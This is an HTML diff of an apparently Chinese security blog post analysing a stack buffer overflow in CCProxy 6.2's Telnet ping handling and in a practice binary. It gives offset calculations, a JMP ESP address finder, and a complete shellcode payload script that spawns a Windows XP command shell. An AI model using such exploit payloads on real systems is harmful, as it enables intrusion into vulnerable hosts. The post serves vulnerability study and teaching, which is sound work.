@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>HackPluto&#39;s Blog</title>
+    <title>CCProxy栈溢出漏洞分析及利用 · HackPluto&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">HackPluto&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CCProxy栈溢出漏洞分析及利用</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">HackPluto's Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/2.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            CCProxy栈溢出漏洞分析及利用
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CCProxy,栈溢出,pwn">CCProxy,栈溢出,pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/11/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,185 +399,143 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/09/27/看雪KCTF2019wp/">
-            
-                <span>看雪KCTF2019wp</span>
-        </a>
-        <div class="abstract-content">
-            1.神秘来信
-先将程序放入IDA中
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><blockquote>
+<p>分析机：winXP SP3（吾爱破解版）IP：172.20.10.3</p>
+</blockquote>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="介绍CCProxy"><a href="#介绍CCProxy" class="headerlink" title="介绍CCProxy"></a>介绍CCProxy</h2><blockquote>
+<p>CCProxy因其设 置简单和使用方便 等特点，成为国内 最受欢迎的代理服 务器软件。CCProxy不但支 持常见的HTTP和 SOCKS代理，而且还 支持FTP和Telnet这 类不常用的协议及 其它协议。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/01/CxTkwcUWISazAVm.jpg" alt></p>
+<blockquote>
+<ol>
+<li>邮件：邮件代理服务，如果服务器上已经安装了邮件服务器，那么请取消该选项。</li>
+<li>DNS：域名解析服务，如果服务器上已经另行配置了DNS服务器，那么请取消该选项，如果启用该选项，那么请确保在客户端的网络设置中将DNS地址设置成CCProxy服务器的地址。</li>
+<li>网页缓存：对应上网时的缓存功能，可提高网络访问速度。</li>
+<li>远程拨号：用来进行自动拨号的，如果您的服务器上已经创建了拨号连接，那么可勾选该选项，然后才能在高级设置中的“拨号”标签下进行后续设置以实现自动拨号的功能。</li>
+<li>自动启动：用来确认CCProxy是否随系统启动。</li>
+<li>自动隐藏：用来确认CCProxy启动后是否自动隐藏至系统托盘。</li>
+<li>端口映射：有些网络应用要使用到端口映射功能(比如GMail的IMAP接收方式)，这时就要勾选该选项，并点击后面的“E”按钮，进入图1-2所示的界面进行端口映射的设置，下图是为GMail的IMAP服务所做端口映射的例子。</li>
+</ol>
+</blockquote>
+<h2 id="漏洞说明及演示"><a href="#漏洞说明及演示" class="headerlink" title="漏洞说明及演示"></a>漏洞说明及演示</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><blockquote>
+<p>CCProxy在代理Telnet协议时，可以接受<br>Ping命令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ping命令格式:ping hostname\r\n</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>当hostname的长度大于或者等于1010字 节时，CCProxy 6.2会发生缓冲区溢出，导致程序崩溃.</p>
+</blockquote>
+<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><blockquote>
+<p>1.使用telnet连接目标主机<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">172.20</span><span class="number">.10</span><span class="number">.3</span> <span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/01/9eTaQCcyJXwnuzP.jpg" alt></p>
+<blockquote>
+<p>2.先输入4个字符</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/01/aUToNmMDYvsIWCk.jpg" alt></p>
+<blockquote>
+<p>3.使用python脚本输出1000个字符，程序崩溃</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/01/7gJWLSeQjaBDroP.jpg" alt></p>
+<h3 id="CCproxy漏洞利用"><a href="#CCproxy漏洞利用" class="headerlink" title="CCproxy漏洞利用"></a>CCproxy漏洞利用</h3><h4 id="定位溢出点分析"><a href="#定位溢出点分析" class="headerlink" title="定位溢出点分析"></a>定位溢出点分析</h4><blockquote>
+<p>用CDB将程序挂起</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdb –pn ccproxy.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/04/KthzpVJGn1WRdA7.jpg" alt></p>
+<blockquote>
+<p>在攻击主机上按前面所述telnet到目标主机上，并通过ping命令把2000个A组成的字符串发送到CCProxy时，CDB捕捉到CCProxy 的Access Violation事件</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/04/WRBhYTHDng9Op8q.jpg" alt></p>
+<p><img src="https://i.loli.net/2019/11/04/h6eNHUlGtsWxXTE.jpg" alt></p>
+<blockquote>
+<p>可以发现，EIP的内容为6161616161(字符a的<br>ASCII码是0x61)这是因为栈中存放RET值的地方已经被61616161 覆盖，当函数返回时，就将这个值弹出到EIP寄存器。我自己写了一个py脚本利用一串不重复的字符填充缓冲区，然后查看覆盖RET的字符串，计算它们在整个字 符串中的位置，从而得出缓冲区的大小及RET的偏移<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">91</span>):</span><br><span class="line">	a += chr(i)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">		a += chr(j)</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">			a += str(k)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/04/hqLe6KJFwEfCmz1.jpg" alt></p>
+<blockquote>
+<p>通过计算出它在整个长为2000的字符串中的偏移是1012,这说明，RET相对缓冲区的偏移大小是1012字节。</p>
+</blockquote>
+<h4 id="填充shellcode"><a href="#填充shellcode" class="headerlink" title="填充shellcode"></a>填充shellcode</h4><blockquote>
+<p>如果是500字节的shellcode应该如何防止最好？这个程序的缓冲区是充足的足足有1008个字节，所以把shellcode放在缓冲区里理论上是行的通的，但是如果放在了缓冲区里就需要知道缓冲区的地址才可以在pop EIP的时候给EIP赋予正确的指令地址，这个方法要想实施下去就比较困难了，需要使用IDA去反汇编这个程序，看看这个地方的缓冲区地址是多少，如果是写死的地址那还可以利用，如果是动态生成的地址空间就没有办法获取准确的地址了。所以这个地方我还是想利用最基本的利用JMP ESP实现跳转，因为在kernel32.dll里就有这个指令的地址。所以最终的payload为:</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'A'</span>*<span class="number">1012</span>+JMP_ESP_addr+shellcode</span><br></pre></td></tr></table></figure>
+<h3 id="stackoverflow-exe漏洞利用"><a href="#stackoverflow-exe漏洞利用" class="headerlink" title="stackoverflow.exe漏洞利用"></a>stackoverflow.exe漏洞利用</h3><h4 id="定位溢出点分析-1"><a href="#定位溢出点分析-1" class="headerlink" title="定位溢出点分析"></a>定位溢出点分析</h4><p><img src="https://i.loli.net/2019/11/01/8mdLDCeysTi7tUg.jpg" alt></p>
+<p><strong>使用IDA分析</strong></p>
+<p><img src="https://i.loli.net/2019/11/01/4cFERIjTfUXw6OV.jpg" alt></p>
+<blockquote>
+<p>漏洞点很明显，strcpy函数没有限制拷贝的长度，这里存在栈溢出漏洞。v4的位置是EBP-0x10，所以溢出点就在EBP偏移16个字节，这个程序v4的空间比较小，只有16字节，如果我们要构造的shellcode有上百个字节长就不能放在v4中，需要将shellcode放在返回地址的后面，返回地址使用jmp esp的地址，构造的payload为<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'A'*16+'BBBB'+jmp_esp_address+shellcode</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h4><h5 id="获取JMP-ESP的地址"><a href="#获取JMP-ESP的地址" class="headerlink" title="获取JMP ESP的地址"></a>获取JMP ESP的地址</h5><blockquote>
+<p>接下来，我们要做的事情就是获取JMP ESP的地址，<br>下面的代码就能实现在kernel32.dll中搜索Jmp Esp的地址<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">        BYTE *ptr;  </span><br><span class="line">        <span class="keyword">int</span> position;  </span><br><span class="line">        HINSTANCE handle;  </span><br><span class="line">        BOOL done_flag = FALSE;  </span><br><span class="line">        handle = LoadLibrary(<span class="string">"kernel32.dll"</span>);  </span><br><span class="line">        <span class="keyword">if</span>(!handle)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"load dll error!"</span>);  </span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        ptr = (BYTE*)handle;  </span><br><span class="line">   </span><br><span class="line">        <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">try</span> </span><br><span class="line">                &#123;  </span><br><span class="line">                        <span class="keyword">if</span>(ptr[position]==<span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>]==<span class="number">0xE4</span>)  </span><br><span class="line">                        &#123;  </span><br><span class="line">                                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;  </span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"OPCODE found at 0x%x\n"</span>, address);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">catch</span>(...)  </span><br><span class="line">                &#123;  </span><br><span class="line">                        <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;  </span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"END OF 0x%x\n"</span>, address);  </span><br><span class="line">                        done_flag = <span class="literal">true</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        getchar();  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>搜到很多，随意找个地址，比如第一个 0x7c874413。由于是小端的字节序所以倒过来就是\x13\x44\x87\x7c。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/01/J8RbjsF9PNvdi7t.jpg" alt></p>
+<h4 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h4><blockquote>
+<p>在Windows上和Linux上做PWN还是有一些区别的，尤其是这里的发送payload有些不习惯，在命令行中直接输入\x显然是不合适。在这里我使用了python的管道操作，也就是popen函数<br>os.popen() 方法用于从一个命令打开一个管道。<br>语法<br>popen()方法语法格式如下：<br>os.popen(command[, mode[, bufsize]])<br>参数<br>command – 使用的命令。<br>mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。<br>bufsize – 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。</p>
+</blockquote>
+<blockquote>
+<p>随便写一个程序作为检验</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">payload = <span class="string">"aaaaaa"</span></span><br><span class="line">pipe = os.popen(<span class="string">"stackoverflow.exe "</span>+payload)</span><br><span class="line">ans = pipe.read()</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/03/tVdo1eIsqnj96Hw.jpg" alt></p>
+<blockquote>
+<p>为了检验上面计算出的JMP ESP指令能不能使用，我现在发送下面这个payload<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaa\x13\x44\x87\x7caaaa</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">payload = <span class="string">"aaaaaaaaaaaaaaaa\x13\x44\x87\x7caaaa"</span></span><br><span class="line">pipe = os.popen(<span class="string">"stackoverflow.exe "</span>+payload)</span><br><span class="line">ans = pipe.read()</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/03/MtuzsFkryClSmWO.jpg" alt></p>
+<blockquote>
+<p>程序没有报错，说明返回值正确，那么现在就是加入正确的shellcode即可<br>我在网上找到了一个打开CMD命令行的shellcode</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*覆盖eip， jmp esp 地址7ffa4512*/</span></span><br><span class="line">    <span class="string">"\x12\x45\xfa\x7f"</span></span><br><span class="line">    <span class="string">"\x55\x8b\xec\x33\xc0\x50\x50\x50\xc6\x45\xf4\x6d"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xf5\x73\xc6\x45\xf6\x76\xc6\x45\xf7\x63"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xf8\x72\xc6\x45\xf9\x74\xc6\x45\xfa\x2e"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xfb\x64\xc6\x45\xfc\x6c\xc6\x45\xfd\x6c"</span></span><br><span class="line">    <span class="string">"\x8d\x45\xf4\x50\xb8"</span></span><br><span class="line">    <span class="comment">/* LoadLibrary 的地址*/</span></span><br><span class="line">    <span class="string">"\x77\x1d\x80\x7c"</span></span><br><span class="line">    <span class="string">"\xff\xd0"</span></span><br><span class="line">    <span class="string">"\x55\x8b\xec\x33\xff\x57\x57\x57\xc6\x45\xf4\x73"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xf5\x74\xc6\x45\xf6\x61\xc6\x45\xf7\x72"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xf8\x74\xc6\x45\xf9\x20\xc6\x45\xfa\x63"</span></span><br><span class="line">    <span class="string">"\xc6\x45\xfb\x6d\xc6\x45\xfc\x64\x8d\x7d\xf4\x57"</span></span><br><span class="line">    <span class="string">"\xba"</span></span><br><span class="line">    <span class="comment">/*System 的地址*/</span></span><br><span class="line">    <span class="string">"\xc7\x93\xbf\x77"</span></span><br><span class="line">    <span class="string">"\xff\xd2"</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>根据上面的shellcode写出脚本</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">payload = <span class="string">"aaaaaaaaaaaaaaaa\x13\x44\x87\x7c\x12\x45\xfa\x7f\x55\x8b\xec\x33\xc0\x50\x50\x50\xc6\x45\xf4\x6d\xc6\x45\xf5\x73\xc6\x45\xf6\x76\xc6\x45\xf7\x63\xc6\x45\xf8\x72\xc6\x45\xf9\x74\xc6\x45\xfa\x2e\xc6\x45\xfb\x64\xc6\x45\xfc\x6c\xc6\x45\xfd\x6c\x8d\x45\xf4\x50\xb8\x77\x1d\x80\x7c\xff\xd0\x55\x8b\xec\x33\xff\x57\x57\x57\xc6\x45\xf4\x73\xc6\x45\xf5\x74\xc6\x45\xf6\x61\xc6\x45\xf7\x72\xc6\x45\xf8\x74\xc6\x45\xf9\x20\xc6\x45\xfa\x63\xc6\x45\xfb\x6d\xc6\x45\xfc\x64\x8d\x7d\xf4\x57\xba\xc7\x93\xbf\x77\xff\xd2"</span> </span><br><span class="line"></span><br><span class="line">pipe = os.popen(<span class="string">"stackoverflow.exe "</span>+payload)</span><br><span class="line">ans = pipe.read()</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>成功PWN</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/04/uSb2LPJQhd1YGrM.jpg" alt></p>
 
-
-
-可以看到这个需要输入一个序列号，长度不能超过7，并且后3位为353，前三位和不能超过149。直接看反汇编的代码有些奇怪，因为并没有成功时候的条件，这里需要查看汇编，发现这里有一个除0异常
-
-
-
-这里涉及到了Windows的SEH机制SEH 的工作原理：Windows 程序设计中最重要的理念就是消息传递，事件驱动。当GUI应用程序触发一个消息时，系统将把该消息放入消息队列，然后去查找并调用窗体的消息处理函数(CALLBACK)，传递的参数当然就是这个消息。我们同样可以把异常也当作是一种消息，应用程序发生异常时就触发了该消息并告知系统。系统接收后同样...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/27</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="看雪,KCTF,逆向,PWN">看雪,KCTF,逆向,PWN</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/09/24/反静态调试总结/">
-            
-                <span>反静态调试总结</span>
-        </a>
-        <div class="abstract-content">
-            花指令
-花指令就是一串没有任何实际意义的指令。为什么会产生花指令呢，因为反汇编器并不知道某一个地方的数据到底是数据还是指令的机器码，所以就会将某些花指令反汇编成真正的汇编指令，由于X86平台的指令是密集编码的，所以很多指令都是一个字节编码的，例如生成一个16kb的随即数据，并对其进行了反汇编。效果如下：
-
-
-
-可以通过_EMIT指令实现花指令123456789101112131415#include &lt;iostream.h&gt;#include &lt;windows.h&gt;void main()&#123;    _asm    &#123;            jmp ...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/11/01/CCProxy栈溢出漏洞分析及利用/">http://yoursite.com/2019/11/01/CCProxy栈溢出漏洞分析及利用/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/11/01/CCProxy栈溢出漏洞分析及利用/">November 1st 2019, 10:21:39 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/11/01/CCProxy栈溢出漏洞分析及利用/">November 4th 2019, 1:22:06 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="花指令,静态调试,Movfuscator">花指令,静态调试,Movfuscator</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/08/06/Traceme动态分析与静态分析/">
-            
-                <span>Traceme动态分析与静态分析</span>
-        </a>
-        <div class="abstract-content">
-            对Traceme.exe进行分析，我用两种方法分析，动态分析和静态分析
-静态分析首先进入winmain入口函数，然后进入DialogFunc函数，这个函数应该就是这个程序的主体了。
-
-将两个strcpy的内容转成字符串，可以得出要输入的字符要大于长度4。
-
-现在要找出程序对于输入的用户名和序列号是如何处理的，1v5 = GetDlgItemTextA(hWnd, 110, &amp;String, 81);
-找到了这句话，看到GetDlgItemTextA这个函数就知道他是在获得对话框的内容向数组里存东西，所以可以判断这两个函数是在存储用户名和序列号
-
-进入sub_401340这个函数就...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="IDA,OllyDB">IDA,OllyDB</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/06/13/攻防世界逆向入门writeup/">
-            
-                <span>攻防世界逆向入门writeup</span>
-        </a>
-        <div class="abstract-content">
-            1.re1这个题方法挺多的，我主要介绍两种1 逆向分析法：拖入IDA后，进入main函数，反汇编看伪C代码简单的分析下整个函数，输入字符串v9，再比较v5,v9,如果不相等就输出 aFlag,相等就输出 unk_413E90。
-
-分别点进这两个内存查看内容
-
-发现这两个地方都不是flag,所以我认为这个题不是输出flag,而是看我们的输入是不是flag,所以跟踪v5字符串对 _mm_storeu_si128() 函数进行进一步分析，这个是intel的一个指令，简而言之就是将参数里后面的直接赋值给前面，所以直接查看 xmmword_413E34 找到了flag
-2 查找字符串：因为我...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="XCTF,逆向">XCTF,逆向</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/06/12/2019看雪CTF逆向Q1writeup/">
-            
-                <span>2019看雪CTF逆向Q1writeup</span>
-        </a>
-        <div class="abstract-content">
-            第一题 流浪者首先使用die查壳后没有发现壳拖到IDA里这个题我本来想直接看伪C代码发现找关键点函数有些困难（还是我太菜了），所以最后发现了更简单的方法shifr + F12查看字符串
-
-发现了一串可疑字符串查看这串字符串的引用 进入这个函数
-其实看到strcmp函数的时候，这个题的意图就比较明显了，就是比较str1和那一串字符串是不是相等，变量a1应该就是数组的首地址，但是我们不知道a1这个数组是怎么得到的，所以查一下sub_4017F0函数的交叉引用从16行的getbuffer可以看出str是直接从内存中读取的也就是我们输入的这里限制了输入的必须是大小写字母或者数字所以直接暴力破解1...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="逆向,CTF">逆向,CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/10/28/DirtyCow漏洞复现及原理分析/" title="DirtyCow漏洞复现及原理分析">
+                    <div class="prevTitle">DirtyCow漏洞复现及原理分析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -596,6 +615,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实验环境"><span class="toc-number">1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍CCProxy"><span class="toc-number">2.1.</span> <span class="toc-text">介绍CCProxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞说明及演示"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞说明及演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞说明"><span class="toc-number">2.2.1.</span> <span class="toc-text">漏洞说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞演示"><span class="toc-number">2.2.2.</span> <span class="toc-text">漏洞演示</span></a></li><li class="toc-item 